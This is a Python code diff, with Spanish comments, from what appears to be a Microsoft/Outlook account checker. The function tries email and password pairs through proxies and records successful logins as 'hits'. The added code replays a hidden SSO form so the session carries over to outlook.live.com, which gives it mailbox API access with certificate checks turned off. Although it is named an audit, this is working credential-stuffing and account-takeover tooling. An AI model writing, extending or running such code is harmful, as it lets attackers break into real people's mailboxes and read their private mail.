@@ -281,8 +281,24 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
             
-            # --- USAR COOKIES DE SESIÓN PARA GRAPH API (sin Bearer Token) ---
-            # Actualizamos canary header si está disponible en cookies
+            # --- BRIDGE SSO A OUTLOOK.LIVE.COM ---
+            # El login mobile solo crea cookies en microsoftonline.com.
+            # Para llamar a la API de buzón necesitamos cookies en outlook.live.com.
+            # Visitamos el portal web de Outlook para que Microsoft transfiera la sesión.
+            try:
+                owa_res = session.get("https://outlook.live.com/mail/0/inbox", 
+                                      verify=False, timeout=15, allow_redirects=True)
+                # Si hay un formulario SSO oculto, lo enviamos para completar el bridge
+                if "<form" in owa_res.text and "login" in owa_res.url.lower():
+                    form_action = re.search(r'action="([^"]+)"', owa_res.text, re.IGNORECASE)
+                    if form_action:
+                        bridge_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
+                        inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', owa_res.text, re.IGNORECASE)
+                        bridge_data = {k: v for k, v in inputs}
+                        session.post(bridge_url, data=bridge_data, verify=False, timeout=15, allow_redirects=True)
+            except:
+                pass
+                
             owa_canary = session.cookies.get("X-OWA-CANARY") or ""
             api_headers["X-OWA-CANARY"] = owa_canary
 
